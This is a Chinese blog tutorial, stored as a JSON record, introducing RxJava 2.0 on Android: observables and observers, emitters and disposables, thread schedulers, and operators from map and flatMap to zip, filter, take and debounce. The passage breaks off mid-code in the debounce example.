{"timestamp": "2018_08_14_11_13_02", "desc": "RxJava可以说是2016年最流行的项目之一了，最近也接触了一下RxJava，于是想写一篇博客，希望能通过这篇博客让大家能对其进行了解，本篇博客是基于RxJava2.0，跟RxJava1.0还是有很多不同的\n\n基础知识\n\nRxJava的核心就是“异步”两个字，其最关键的东西就是两个：\n\n\nObservable（被观察者） \nObserver/Subscriber（观察者）\n\n\nObservable可以发出一系列的 事件，这里的事件可以是任何东西，例如网络请求、复杂计算处理、数据库操作、文件操作等等，事件执行结束后交给 Observer回调处理。\n\nObservable可以理解为事件的发送者，就好像快递的寄出者，而这些事件就好比快递 \nObserver可以理解为事件的接收者，就好像快递的接收者\n\n那他们之间是如何进行联系的呢？答案就是通过subscribe()方法，下面的代码就是RXJAVA中Observable与Observer进行关联的典型方式：\n\n\n\n//创建一个被观察者 Observable\n    Observable<Integer> observable = Observable.create(new ObservableOnSubscribe<Integer>() {\n        @Override\n        public void subscribe(ObservableEmitter<Integer> e) throws Exception {\n            e.onNext(5);\n            e.onNext(6);\n            e.onNext(7);\n            e.onNext(8);\n            e.onComplete();\n        }\n    });\n\n    //创建观察者observer\n    Observer<Integer> observer = new Observer<Integer>() {\n        @Override\n        public void onSubscribe(Disposable d) {\n            Log.d(TAG, \"subscribe\");\n        }\n\n        @Override\n        public void onNext(Integer value) {\n            Log.d(TAG, value.toString());\n        }\n\n        @Override\n        public void onError(Throwable e) {\n            Log.d(TAG, \"error\");\n        }\n\n        @Override\n        public void onComplete() {\n            Log.d(TAG, \"complete\");\n        }\n    };\n    //建立关联\n    observable.subscribe(observer);\n\n运行项目，我们可以看到，数字已经打印出来 \n\n\n这里需要强调的是: 只有当观察者和被观察者建立连接之后, 被观察者才会开始发送事件. 也就是调用了subscribe()方法之后才开始发送事件.\n\n上面我们看到观察者和被观察者的逻辑是分开写的，那能不能合在一起写呢？答案是肯定的，这也是RxJava比较突出的优点，那就是链式操作，代码如下：\n\n\n\nObservable.create(new ObservableOnSubscribe<Integer>() {\n    @Override\n    public void subscribe(ObservableEmitter<Integer> e) throws Exception {\n        e.onNext(5);\n        e.onNext(6);\n        e.onNext(7);\n        e.onNext(8);\n        e.onComplete();\n    }\n}).subscribe(new Observer<Integer>() {\n    @Override\n    public void onSubscribe(Disposable d) {\n        Log.d(TAG, \"subscribe\");\n    }\n\n    @Override\n    public void onNext(Integer value) {\n        Log.d(TAG, value.toString());\n    }\n\n    @Override\n    public void onError(Throwable e) {\n        Log.d(TAG, \"error\");\n    }\n\n    @Override\n    public void onComplete() {\n        Log.d(TAG, \"complete\");\n    }\n});\n\n\n有时候，你可能觉得，我就打印几个数，还要把Observable写的那么麻烦，能不能简便一点呢？答案是肯定的，RxJava内置了很多简化创建Observable对象的函数，比如Observable.just就是用来创建只发出一个事件就结束的Observable对象，上面创建Observable对象的代码可以简化为一行\n\n\n\nObservable<String> observable = Observable.just(\"hello\");\n\n同样对于Observer，这个例子中，我们其实并不关心OnComplete和OnError，我们只需要在onNext的时候做一些处理，这时候就可以使用Consumer类。\n\n\n\nObservable<String> observable = Observable.just(\"hello\");\n   Consumer<String> consumer = new Consumer<String>() {\n       @Override\n       public void accept(String s) throws Exception {\n           System.out.println(s);\n       }\n   };\n    observable.subscribe(consumer);\n\n\n\n其实在RxJava中，我们可以为 Observer中的三种状态根据自身需要分别创建一个回调动作，通过Action 来替代onComplete():，通过Consumer来替代 onError(Throwable t)和onNext(T t)\n\nObservable<String> observable = Observable.just(\"hello\");\n    Action onCompleteAction = new Action() {\n        @Override\n        public void run() throws Exception {\n            Log.i(TAG, \"complete\");\n        }\n    };\n    Consumer<String> onNextConsumer = new Consumer<String>() {\n        @Override\n        public void accept(String s) throws Exception {\n            Log.i(TAG, s);\n        }\n    };\n    Consumer<Throwable> onErrorConsumer = new Consumer<Throwable>() {\n        @Override\n        public void accept(Throwable throwable) throws Exception {\n            Log.i(TAG, \"error\");\n        }\n    };\n    observable.subscribe(onNextConsumer, onErrorConsumer, onCompleteAction);\n\n}\n\n\n\n\nObservable.just同样可以发送多个参数\n\n\n\nObservable observable = Observable.just(\"you\", \"are\", \"beautiful\");\nConsumer<String> onNextConsumer = new Consumer<String>() {\n    @Override\n    public void accept(String s) throws Exception {\n        Log.i(TAG, s);\n    }\n};\nobservable.subscribe(onNextConsumer);\n\n\n\n\n例子：来一个简单的例子来了解事件的产生到消费、订阅的过程：从res/mipmap中取出一张图片，显示在ImageView上。\n\nfinal ImageView ivLogo = (ImageView) findViewById(R.id.logo);\nObservable.create(new ObservableOnSubscribe<Drawable>() {\n\n\n    @Override\n    public void subscribe(ObservableEmitter<Drawable> e) throws Exception {\n        // 从mipmap取出一张图片作为Drawable对象\n        Drawable drawable = ContextCompat.getDrawable(MainActivity.this, R.mipmap.ic_launcher);\n\n        // 把Drawable对象发送出去\n        e.onNext(drawable);\n        e.onComplete();\n    }\n}).subscribe(new Observer<Drawable>() {\n    @Override\n    public void onSubscribe(Disposable d) {\n\n    }\n\n    @Override\n    public void onNext(Drawable value) {\n        ivLogo.setImageDrawable(value);\n    }\n\n    @Override\n    public void onError(Throwable e) {\n\n    }\n\n    @Override\n    public void onComplete() {\n\n    }\n});\n\n这样就完成了一个简单的图片的设置 \n\n\n\n\nObservableEmitter和Disposable\n\nObservableEmitter： ObservableEmitter可以理解为发射器，这个就是用来发出事件的，它可以发出三种类型的事件，通过调用emitter的onNext(T value)、onComplete()和onError(Throwable error)就可以分别发出next事件、complete事件和error事件。 \n注意：但是事件的发送是有一定的规定的，就好比寄快递也要有一定要求，不是什么都能寄的：\n\n1．被观察者可以发送无限个onNext, 观察者也可以接收无限个onNext. \n2．当Observable发送了一个onComplete后, Observable的onComplete之后的事件将会继续发送, 而Observer收到onComplete事件之后将不再继续接收事件. \n3．当Observable发送了一个onError后, Observable中onError之后的事件将继续发送, 而Observer收到onError事件之后将不再继续接收事件. \n4．Observable可以不发送onComplete或onError. \n5．最为关键的是onComplete和onError必须唯一并且互斥, 即不能发多个onComplete, 也不能发多个onError, 也不能先发一个onComplete, 然后再发一个onError, 反之亦然\n\n注: 关于onComplete和onError唯一并且互斥这一点, 是需要自行在代码中进行控制, 如果你的代码逻辑中违背了这个规则, 并不一定会导致程序崩溃. 比如发送多个onComplete是可以正常运行的, 依然是收到第一个onComplete就不再接收了, 但若是发送多个onError, 则收到第二个onError事件会导致程序会崩溃.当我们写多个onComplete时，不会报错\n\n当我们又有onComplete又有onError时，发现在调用onComplete后会爆出异常\n\n\n\nObservable.create(new ObservableOnSubscribe<Integer>() {\n    @Override\n    public void subscribe(ObservableEmitter<Integer> e) throws Exception {\n        e.onNext(5);\n        e.onNext(6);\n        e.onNext(7);\n        e.onNext(8);\n\n        e.onError(new NullPointerException());\n        e.onComplete();\n    }\n})\n\n这是onComplete在onError前调用的情况 \n\n\n当我们写两个onError时，会先接受前面的所有事件，最后才报错 \n\n\n介绍了ObservableEmitter, 接下来介绍Disposable, 当调用dispose()方法时, 它就会将观察者和被观察者的联系切断, 从而导致观察者收不到事件.\n\n注意: 调用dispose()并不会导致Observable不再继续发送事件, Observable会继续发送剩余的事件. \n看一下下面这个例子：\n\n\n\nObservable.create(new ObservableOnSubscribe<Integer>() {\n        @Override\n        public void subscribe(ObservableEmitter<Integer> emitter) throws Exception {\n            Log.d(TAG, \"emitter 1\");\n            emitter.onNext(1);\n            Log.d(TAG, \"emitter 2\");\n            emitter.onNext(2);\n            Log.d(TAG, \"emitter 3\");\n            emitter.onNext(3);\n            Log.d(TAG, \"emitter complete\");\n            emitter.onComplete();\n            Log.d(TAG, \"emitter 4\");\n            emitter.onNext(4);\n        }\n    }).subscribe(new Observer<Integer>() {\n        private Disposable mDisposable;\n        private int i;\n\n        @Override\n        public void onSubscribe(Disposable d) {\n            Log.d(TAG, \"subscribe\");\n            mDisposable = d;\n        }\n\n        @Override\n        public void onNext(Integer value) {\n            Log.d(TAG, \"onNext: \" + value);\n            i++;\n            if (i == 2) {\n                Log.d(TAG, \"dispose\");\n                mDisposable.dispose();\n                Log.d(TAG, \"isDisposed : \" + mDisposable.isDisposed());\n            }\n        }\n\n        @Override\n        public void onError(Throwable e) {\n            Log.d(TAG, \"error\");\n        }\n\n        @Override\n        public void onComplete() {\n            Log.d(TAG, \"complete\");\n        }\n    });\n}\n\n打印如下： \n\n\n在收到onNext 2这个事件后, 我们中断了联系， 但是Observable \n仍然发送了3, complete, 4这几个事件, 而且Observable \n并没有因为发送了onComplete而停止. 同时可以看到Observer的onSubscribe()方法是最先调用的.\n\nsubscribe()有多个重载的方法:\n\n\n\n public final Disposable subscribe() {}\n public final Disposable subscribe(Consumer<? super T> onNext) {}\n public final Disposable subscribe(Consumer<? super T> onNext, Consumer<? super Throwable> onError) {} \n public final Disposable subscribe(Consumer<? super T> onNext, Consumer<? super Throwable> onError, Action onComplete) {}\n public final Disposable subscribe(Consumer<? super T> onNext, Consumer<? super Throwable> onError, Action onComplete, Consumer<? super Disposable> onSubscribe) {}\n public final void subscribe(Observer<? super T> observer) {}\n\n\n不带任何参数的subscribe() 表示Observer不关心任何事件,Observable发送什么数据都随你 \n带有一个Consumer参数的方法表示Observer只关心onNext事件, 其他的事件我假装没看见, 因此我们如果只需要onNext事件可以这么写:\n\n\n\nObservable.create(new ObservableOnSubscribe<Integer>() {\n        @Override\n        public void subscribe(ObservableEmitter<Integer> emitter) throws Exception {\n            Log.d(TAG, \"emitter 1\");\n            emitter.onNext(1);\n            Log.d(TAG, \"emitter 2\");\n            emitter.onNext(2);\n            Log.d(TAG, \"emitter 3\");\n            emitter.onNext(3);\n            Log.d(TAG, \"emitter complete\");\n            emitter.onComplete();\n            Log.d(TAG, \"emitter 4\");\n            emitter.onNext(4);\n        }\n    }).subscribe(new Consumer<Integer>() {\n        @Override\n        public void accept(Integer integer) throws Exception {\n            Log.d(TAG, \"onNext: \" + integer);\n        }\n    });\n\n其他方式也是类似的方式\n\n\n\n线程调度\n\n正常情况下, Observer和Observable是工作在同一个线程中的, 也就是说Observable在哪个线程发事件, Observer就在哪个线程接收事件. \nRxJava中, 当我们在主线程中去创建一个Observable来发送事件, 则这个Observable默认就在主线程发送事件. \n当我们在主线程去创建一个Observer来接收事件, 则这个Observer默认就在主线程中接收事件，但其实在现实工作中我们更多的是需要进行线程切换的，最常见的例子就是在子线程中请求网络数据，在主线程中进行展示\n\n要达到这个目的, 我们需要先改变Observable发送事件的线程, 让它去子线程中发送事件, 然后再改变Observer的线程, 让它去主线程接收事件. 通过RxJava内置的线程调度器可以很轻松的做到这一点. 接下来看一段代码:\n\nObservable<Integer> observable = Observable.create(new ObservableOnSubscribe<Integer>() {\n        @Override\n        public void subscribe(ObservableEmitter<Integer> emitter) throws Exception {\n            Log.d(TAG, \"Observable thread is : \" + Thread.currentThread().getName());\n            Log.d(TAG, \"emitter 1\");\n            emitter.onNext(1);\n        }\n    });\n\n    Consumer<Integer> consumer = new Consumer<Integer>() {\n        @Override\n        public void accept(Integer integer) throws Exception {\n            Log.d(TAG, \"Observer thread is :\" + Thread.currentThread().getName());\n            Log.d(TAG, \"onNext: \" + integer);\n        }\n    };\n\n    observable.subscribeOn(Schedulers.newThread())\n            .observeOn(AndroidSchedulers.mainThread())\n            .subscribe(consumer);\n}\n\n \n可以看到, observable发送事件的线程的确改变了, 是在一个叫 RxNewThreadScheduler-1的线程中发送的事件, 而consumer 仍然在主线程中接收事件, 这说明我们的目的达成了, 接下来看看是如何做到的.\n\n这段代码只不过是增加了两行代码:\n\n.subscribeOn(Schedulers.newThread())\n        .observeOn(AndroidSchedulers.mainThread())\n\n简单的来说, subscribeOn() 指定的是Observable发送事件的线程, observeOn() 指定的是Observer接收事件的线程. \n多次指定Observable的线程只有第一次指定的有效, 也就是说多次调用subscribeOn() 只有第一次的有效, 其余的会被忽略. \n多次指定Observer的线程是可以的, 也就是说每调用一次observeOn() , Observer的线程就会切换一次.例如:\n\n\n\nobservable.subscribeOn(Schedulers.newThread())\n        .subscribeOn(Schedulers.io())\n        .observeOn(AndroidSchedulers.mainThread())\n        .observeOn(Schedulers.io())\n        .subscribe(consumer);\n\n这段代码中指定了两次上游发送事件的线程, 分别是newThread和IO线程, 下游也指定了两次线程,分别是main和IO线程. 运行结果为: \n\n\n可以看到, Observable虽然指定了两次线程, 但只有第一次指定的有效, 依然是在RxNewThreadScheduler线程中, 而Observer则跑到了RxCachedThreadScheduler 中, 这个CacheThread其实就是IO线程池中的一个.\n\n在 RxJava 中，提供了一个名为 Scheduler 的线程调度器，RxJava 内部提供了4个调度器，分别是：\n\nSchedulers.io(): I/O 操作（读写文件、数据库、网络请求等），与newThread()差不多，区别在于io() 的内部实现是是用一个无数量上限的线程池，可以重用空闲的线程，因此多数情况下 io() 效率比 newThread() 更高。值得注意的是，在 io() 下，不要进行大量的计算，以免产生不必要的线程；\n\nSchedulers.newThread(): 开启新线程操作；\n\nSchedulers.immediate(): 默认指定的线程，也就是当前线程；\n\nSchedulers.computation():计算所使用的调度器。这个计算指的是 CPU 密集型计算，即不会被 I/O等操作限制性能的操作，例如图形的计算。这个 Scheduler 使用的固定的线程池，大小为 CPU 核数。值得注意的是，不要把 I/O 操作放在 computation() 中，否则 I/O 操作的等待时间会浪费 CPU；\n\nAndroidSchedulers.mainThread(): RxJava 扩展的 Android 主线程；\n\n这些内置的Scheduler已经足够满足我们开发的需求, 因此我们应该使用内置的这些选项, 在RxJava内部使用的是线程池来维护这些线程, 所有效率也比较高.\n\n例子：还是用之前设置图片的例子，这次我们在子线程中进行网络请求获取图片，在主线程中对图片进行设置\n\n\n\nfinal ImageView ivLogo = (ImageView) findViewById(R.id.logo);\nObservable.create(new ObservableOnSubscribe<Drawable>() {\n\n\n    @Override\n    public void subscribe(ObservableEmitter<Drawable> e) throws Exception {\n        try {\n            Drawable drawable = Drawable.createFromStream(new URL(\"https://ss2.baidu.com/6ONYsjip0QIZ8tyhnq/it/u=2502144641,437990411&fm=80&w=179&h=119&img.JPEG\").openStream(), \"src\");\n            e.onNext(drawable);\n        } catch (IOException error) {\n            e.onError(error);\n        }\n    }\n})// 指定 subscribe() 所在的线程，也就是上面subscribe()方法调用的线程\n        .subscribeOn(Schedulers.io())\n        // 指定 Observer 回调方法所在的线程，也就是onCompleted, onError, onNext回调的线程\n        .observeOn(AndroidSchedulers.mainThread())\n        .subscribe(new Observer<Drawable>() {\n    @Override\n    public void onSubscribe(Disposable d) {\n\n    }\n\n    @Override\n    public void onNext(Drawable value) {\n        ivLogo.setImageDrawable(value);\n    }\n\n    @Override\n    public void onError(Throwable e) {\n\n    }\n\n    @Override\n    public void onComplete() {\n\n    }\n});\n\n这段代码就做一件事，在 io 线程加载一张网络图片，加载完毕之后在主线程中显示到ImageView上。\n\n\n\n操作符的使用\n\n在了解基本知识和线程调度后，我们来学习一下RxJava各种神奇的操作符\n\nMap \nMap是RxJava中最简单的一个变换操作符了, 它的作用就是对Observable发送的每一个事件应用一个函数, 使得每一个事件都按照指定的函数去变化. \n\nObservable.create(new ObservableOnSubscribe<Integer>() {\n        @Override\n        public void subscribe(ObservableEmitter<Integer> emitter) throws Exception {\n            emitter.onNext(1);\n            emitter.onNext(2);\n            emitter.onNext(3);\n        }\n    }).map(new Function<Integer, String>() {\n        @Override\n        public String apply(Integer integer) throws Exception {\n            return \"This is result \" + integer;\n        }\n    }).subscribe(new Consumer<String>() {\n        @Override\n        public void accept(String s) throws Exception {\n            Log.d(TAG, s);\n        }\n    });\n\n在Observable我们发送的是数字类型, 而在Observer我们接收的是String类型, 中间起转换作用的就是Map操作符, 运行结果为: \n\n\n通过Map, 可以将Observable发来的事件转换为任意的类型, 可以是一个Object, 也可以是一个集合，功能非常强大\n\n例子：还是以图片加载的例子，我们传进来一个图片的路径，然后通过Map进行转换成drawble再发送给观察者\n\nfinal ImageView ivLogo = (ImageView) findViewById(R.id.logo);\nObservable.create(new ObservableOnSubscribe<String>() {\n    @Override\n    public void subscribe(ObservableEmitter<String> e) throws Exception {\n        e.onNext(\"https://ss2.baidu.com/-vo3dSag_xI4khGko9WTAnF6hhy/image/h%3D200/sign=4db5130a073b5bb5a1d727fe06d2d523/cf1b9d16fdfaaf51965f931e885494eef11f7ad6.jpg\");\n    }\n}).map(new Function<String, Drawable>() {\n    @Override\n    public Drawable apply(String url) throws Exception {\n        try {\n            Drawable drawable = Drawable.createFromStream(new URL(url).openStream(), \"src\");\n            return drawable;\n        } catch (IOException e) {\n\n        }\n        return null;\n    }\n})  .subscribeOn(Schedulers.io())\n        // 指定 Observer 回调方法所在的线程，也就是onCompleted, onError, onNext回调的线程\n        .observeOn(AndroidSchedulers.mainThread())\n        .subscribe(new Observer<Drawable>() {\n            @Override\n            public void onSubscribe(Disposable d) {\n\n            }\n\n            @Override\n            public void onNext(Drawable value) {\n                if (value != null) {\n                    ivLogo.setImageDrawable(value);\n                }\n            }\n\n            @Override\n            public void onError(Throwable e) {\n                Log.e(TAG, e.toString());\n            }\n\n            @Override\n            public void onComplete() {\n\n            }\n        });\n\n效果如下： \n\n\n经过改写代码后，有什么变化呢？ Observable 创建了一个 String 事件，也就是产生一个url，通过 map 操作符进行变换，返回Drawable对象，这个变换指的就是通过url进行网络图片请求，返回一个Drawable。所以简单的来说就是把String事件，转换为Drawable事件。逻辑表示就是 \nObservable –> map变换 –> Observable\n\nFlatMap \nFlatMap将一个发送事件的Observable变换为多个发送事件的Observables，然后将它们发射的事件合并后放进一个单独的Observable里.\n\nObservable每发送一个事件, flatMap都将对其进行转换, 然后发送转换之后的新的事件, Observer接收到的就是转换后发送的数据. 这里需要注意的是, flatMap并不保证事件的顺序, 如果需要保证顺序则需要使用concatMap.\n\n Observable.create(new ObservableOnSubscribe<Integer>() {\n        @Override\n        public void subscribe(ObservableEmitter<Integer> emitter) throws Exception {\n            emitter.onNext(1);\n            emitter.onNext(2);\n            emitter.onNext(3);\n        }\n    }).flatMap(new Function<Integer, ObservableSource<String>>() {\n        @Override\n        public ObservableSource<String> apply(Integer integer) throws Exception {\n            final List<String> list = new ArrayList<>();\n            for (int i = 0; i < 3; i++) {\n                list.add(\"I am value \" + integer);\n            }\n            return Observable.fromIterable(list).delay(10, TimeUnit.MILLISECONDS);\n        }\n    }).subscribe(new Consumer<String>() {\n        @Override\n        public void accept(String s) throws Exception {\n            Log.d(TAG, s);\n        }\n    });\n\n效果如下： \n\n\nMap 与 flatMap 这两个操作符的共同点在于，他们都是把一个对象转换为另一个对象，但须注意以下这些特点:\n\n1.flatMap 返回的是一个Observable对象，而 map 返回的是一个普通转换后的对象; \n2.flatMap 返回的Observable对象并不是直接发送到Subscriber的回调中，而是重新创建一个Observable对象，并激活这个Observable对象，使之开始发送事件；而 map 变换后返回的对象直接发到Subscriber回调中； \n3.flatMap 变换后产生的每一个Observable对象发送的事件，最后都汇入同一个Observable，进而发送给Subscriber回调； \n4.map返回类型 与 flatMap 返回的Observable事件类型，可以与原来的事件类型一样； \n5.可以对一个Observable多次使用 map 和 flatMap；\n\n鉴于 flatMap 自身强大的功能，这常常被用于 嵌套的异步操作，例如嵌套网络请求。传统的嵌套请求，一般都是在前一个请求的 onSuccess() 回调里面发起新的请求，这样一旦嵌套多个的话，缩进就是大问题了，而且严重的影响代码的可读性。而RxJava嵌套网络请求仍然通过链式结构，保持代码逻辑的清晰！举个栗子：\n\npublic interface Api {\n    @GET\n    Observable<LoginResponse> login(@Body LoginRequest request);\n\n    @GET\n    Observable<RegisterResponse> register(@Body RegisterRequest request);\n\n}\n\n接着创建一个Retrofit客户端:\n\n\n\nprivate static Retrofit create() {\n    OkHttpClient.Builder builder = new OkHttpClient().newBuilder();\n    builder.readTimeout(10, TimeUnit.SECONDS);\n    builder.connectTimeout(9, TimeUnit.SECONDS);\n\n    if (BuildConfig.DEBUG) {\n        HttpLoggingInterceptor interceptor = new HttpLoggingInterceptor();\n        interceptor.setLevel(HttpLoggingInterceptor.Level.BODY);\n        builder.addInterceptor(interceptor);\n    }\n\n    return new Retrofit.Builder().baseUrl(ENDPOINT)\n            .client(builder.build())\n            .addConverterFactory(GsonConverterFactory.create())\n            .addCallAdapterFactory(RxJava2CallAdapterFactory.create())\n            .build();\n}\n\n发起请求就很简单了:\n\n\n\nApi api = retrofit.create(Api.class);\napi.login(request)\n        .subscribeOn(Schedulers.io())               //在IO线程进行网络请求\n        .observeOn(AndroidSchedulers.mainThread())  //回到主线程去处理请求结果\n        .subscribe(new Observer<LoginResponse>() {\n            @Override\n            public void onSubscribe(Disposable d) {}\n\n            @Override\n            public void onNext(LoginResponse value) {}\n\n            @Override\n            public void onError(Throwable e) {\n                Toast.makeText(mContext, \"登录失败\", Toast.LENGTH_SHORT).show();\n            }\n\n            @Override\n            public void onComplete() {\n                Toast.makeText(mContext, \"登录成功\", Toast.LENGTH_SHORT).show();\n            }\n        });\n\nconcatMap \n这里也简单说一下concatMap吧, 它和flatMap的作用几乎一模一样, 只是它的结果是严格按照上游发送的顺序来发送的, 来看个代码吧:\n\n\n\nObservable.create(new ObservableOnSubscribe<Integer>() {\n        @Override\n        public void subscribe(ObservableEmitter<Integer> emitter) throws Exception {\n            emitter.onNext(1);\n            emitter.onNext(2);\n            emitter.onNext(3);\n        }\n    }).concatMap(new Function<Integer, ObservableSource<String>>() {\n        @Override\n        public ObservableSource<String> apply(Integer integer) throws Exception {\n            final List<String> list = new ArrayList<>();\n            for (int i = 0; i < 3; i++) {\n                list.add(\"I am value \" + integer);\n            }\n            return Observable.fromIterable(list).delay(10,TimeUnit.MILLISECONDS);\n        }\n    }).subscribe(new Consumer<String>() {\n        @Override\n        public void accept(String s) throws Exception {\n            Log.d(TAG, s);\n        }\n    });\n\n只是将之前的flatMap改为了concatMap, 其余原封不动, 运行结果如下: \n\n\n可以看到, 结果仍然是有序的.\n\nZIP \nZip通过一个函数将多个Observable发送的事件结合到一起，然后发送这些组合到一起的事件. 它按照严格的顺序应用这个函数。它只发射与发射数据项最少的那个Observable一样多的数据。\n\n\n\nObservable<Integer> observable1 = Observable.create(new ObservableOnSubscribe<Integer>() {\n        @Override\n        public void subscribe(ObservableEmitter<Integer> emitter) throws Exception {\n            Log.d(TAG, \"emitter 1\");\n            emitter.onNext(1);\n            Log.d(TAG, \"emitter 2\");\n            emitter.onNext(2);\n            Log.d(TAG, \"emitter 3\");\n            emitter.onNext(3);\n            Log.d(TAG, \"emitter 4\");\n            emitter.onNext(4);\n            Log.d(TAG, \"emit complete1\");\n            emitter.onComplete();\n        }\n    });\n\n    Observable<String> observable2 = Observable.create(new ObservableOnSubscribe<String>() {\n        @Override\n        public void subscribe(ObservableEmitter<String> emitter) throws Exception {\n            Log.d(TAG, \"emitter A\");\n            emitter.onNext(\"A\");\n            Log.d(TAG, \"emitter B\");\n            emitter.onNext(\"B\");\n            Log.d(TAG, \"emitter C\");\n            emitter.onNext(\"C\");\n            Log.d(TAG, \"emitter complete2\");\n            emitter.onComplete();\n        }\n    });\n\n    Observable.zip(observable1, observable2, new BiFunction<Integer, String, String>() {\n        @Override\n        public String apply(Integer integer, String s) throws Exception {\n            return integer + s;\n        }\n    }).subscribe(new Observer<String>() {\n        @Override\n        public void onSubscribe(Disposable d) {\n            Log.d(TAG, \"onSubscribe\");\n        }\n\n        @Override\n        public void onNext(String value) {\n            Log.d(TAG, \"onNext: \" + value);\n        }\n\n        @Override\n        public void onError(Throwable e) {\n            Log.d(TAG, \"onError\");\n        }\n\n        @Override\n        public void onComplete() {\n            Log.d(TAG, \"onComplete\");\n        }\n    });\n\n我们分别创建了observable, 一个发送1,2,3,4,Complete, 另一个发送A,B,C,Complete, 接着用Zip把发出的事件组合, 来看看运行结果吧: \n \n观察发现observable1发送事件后，observable2才发送 \n这是因为我们两个observable都是运行在同一个线程里, 同一个线程里执行代码肯定有先后顺序呀.\n\n\n\nObservable<Integer> observable1 = Observable.create(new ObservableOnSubscribe<Integer>() {\n        @Override\n        public void subscribe(ObservableEmitter<Integer> emitter) throws Exception {\n            Log.d(TAG, \"emit 1\");\n            emitter.onNext(1);\n            Thread.sleep(1000);\n\n            Log.d(TAG, \"emit 2\");\n            emitter.onNext(2);\n            Thread.sleep(1000);\n\n            Log.d(TAG, \"emit 3\");\n            emitter.onNext(3);\n            Thread.sleep(1000);\n\n            Log.d(TAG, \"emit 4\");\n            emitter.onNext(4);\n            Thread.sleep(1000);\n\n            Log.d(TAG, \"emit complete1\");\n            emitter.onComplete();\n        }\n    }).subscribeOn(Schedulers.io());\n\n    Observable<String> observable2 = Observable.create(new ObservableOnSubscribe<String>() {\n        @Override\n        public void subscribe(ObservableEmitter<String> emitter) throws Exception {\n            Log.d(TAG, \"emit A\");\n            emitter.onNext(\"A\");\n            Thread.sleep(1000);\n\n            Log.d(TAG, \"emit B\");\n            emitter.onNext(\"B\");\n            Thread.sleep(1000);\n\n            Log.d(TAG, \"emit C\");\n            emitter.onNext(\"C\");\n            Thread.sleep(1000);\n\n            Log.d(TAG, \"emit complete2\");\n            emitter.onComplete();\n        }\n    }).subscribeOn(Schedulers.io());\n\n    Observable.zip(observable1, observable2, new BiFunction<Integer, String, String>() {\n        @Override\n        public String apply(Integer integer, String s) throws Exception {\n            return integer + s;\n        }\n    }).subscribe(new Observer<String>() {\n        @Override\n        public void onSubscribe(Disposable d) {\n            Log.d(TAG, \"onSubscribe\");\n        }\n\n        @Override\n        public void onNext(String value) {\n            Log.d(TAG, \"onNext: \" + value);\n        }\n\n        @Override\n        public void onError(Throwable e) {\n            Log.d(TAG, \"onError\");\n        }\n\n        @Override\n        public void onComplete() {\n            Log.d(TAG, \"onComplete\");\n        }\n    });\n\n好了, 这次我们让事件都在IO线程里发送事件, 再来看看运行结果: \n\n\n第一个observable明明发送了四个数据+一个Complete, 之前明明还有的, 为啥到这里没了呢? \n这是因为我们之前说了, zip发送的事件数量跟observable中发送事件最少的那一个的事件数量是有关的, 在这个例子里我们observable2只发送了三个事件然后就发送了Complete, 这个时候尽管observable1还有事件4 和事件Complete 没有发送, 但是它们发不发送还有什么意义呢?\n\nfrom \n\n在RxJava的from操作符到2.0已经被拆分成了3个，fromArray, fromIterable, fromFuture接收一个集合作为输入，然后每次输出一个元素给subscriber。\n\n\n\nObservable.fromArray(new Integer[]{1, 2, 3, 4, 5}).subscribe(new Consumer<Integer>() {\n    @Override\n    public void accept(Integer integer) throws Exception {\n        Log.i(TAG, \"number:\" + integer);\n    }\n});\n\n\n\n\n注意：如果from()里面执行了耗时操作，即使使用了subscribeOn(Schedulers.io())，仍然是在主线程执行，可能会造成界面卡顿甚至崩溃，所以耗时操作还是使用Observable.create(…);\n\nfilter  \n条件过滤，去除不符合某些条件的事件。举个栗子:\n\n\n\nObservable.fromArray(new Integer[]{1, 2, 3, 4, 5})\n       .filter(new Predicate<Integer>() {\n           @Override\n           public boolean test(Integer integer) throws Exception {\n               // 偶数返回true，则表示剔除奇数，留下偶数\n               return integer % 2 == 0;\n\n           }\n       }).subscribe(new Consumer<Integer>() {\n    @Override\n    public void accept(Integer integer) throws Exception {\n        Log.i(TAG, \"number:\" + integer);\n    }\n});\n\n\n\ntake  \n最多保留的事件数。\n\n Observable.just(\"1\", \"2\", \"6\", \"3\", \"4\", \"5\").take(2).subscribe(new Observer<String>() {\n            @Override\n            public void onSubscribe(Disposable d) {\n\n            }\n\n            @Override\n            public void onNext(String value) {\n                Log.d(TAG,value);\n            }\n\n            @Override\n            public void onError(Throwable e) {\n\n            }\n\n            @Override\n            public void onComplete() {\n\n            }\n        });\n\n \n可以发现我们发送了6个String，最后只打印了前两个，这就是take过滤掉的结果\n\ndoOnNext  \n如果你想在处理下一个事件之前做某些事，就可以调用该方法\n\nObservable.fromArray(new Integer[]{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12}).filter(new Predicate<Integer>() {\n    @Override\n    public boolean test(Integer integer) throws Exception {\n        // 偶数返回true，则表示剔除奇数\n        return integer % 2 == 0;\n    }\n})// 最多保留三个，也就是最后剩三个偶数\n        .take(3).doOnNext(new Consumer<Integer>() {\n    @Override\n    public void accept(Integer integer) throws Exception {\n        // 在输出偶数之前输出它的hashCode\n        Log.i(TAG, \"hahcode = \" + integer.hashCode() + \"\");\n    }\n}).subscribe(new Observer<Integer>() {\n    @Override\n    public void onSubscribe(Disposable d) {\n\n    }\n\n    @Override\n    public void onNext(Integer value) {\n        Log.i(TAG, \"number = \" + value);\n    }\n\n    @Override\n    public void onError(Throwable e) {\n\n    }\n\n    @Override\n    public void onComplete() {\n\n    }\n});\n\n\n\n\ndebounce  \ndebounce也是用于事件的过滤，可以指定过滤事件的时间间隔\n\n\n\nObservable.create(new ObservableOnSubscribe<Integer>() {\n    @Override\n    public void subscribe(ObservableEmitter<Integer> e) throws Exception {\n        int i = 0;\n        int[] times = new int[]{100, 1000};\n        while (true) {\n            i++;\n            if (i >= 100)\n                break;\n            e.onNext(i);\n            try {\n                // 注意！！！！\n                // 当i为奇数时，休眠1000ms，然后才发送i+1，这时i不会被过滤掉\n                // 当i为偶数时，只休眠100ms，便发送i+1，这时i会被过滤掉\n                Thread.sleep(times[i % 2]);\n            } catch (InterruptedException error) {\n                error.printStackTrace();\n            }\n        }\n        e.onComplete();\n    }\n})// 间隔400ms以内的事件将被丢弃\n        .debounce(400, TimeUnit.MILLISECONDS).subscribeOn(Schedulers.io())\n        .observeOn(AndroidSchedulers.mainThread())\n        .subscribe(new Observer<Integer>() {\n\n\n            @Override\n            public void onError(Throwable e) {\n                Log.e(TAG, e.toString());\n            }\n\n            @Override\n            public void onComplete() {\n                Log.i(TAG, \"complete\");\n            }\n\n            @Override\n            public void onSubscribe(Disposable d) {\n\n            }\n\n            @Override\n            public void onNext(Integer integer) {\n                Log.i(TAG, \"integer = \" + 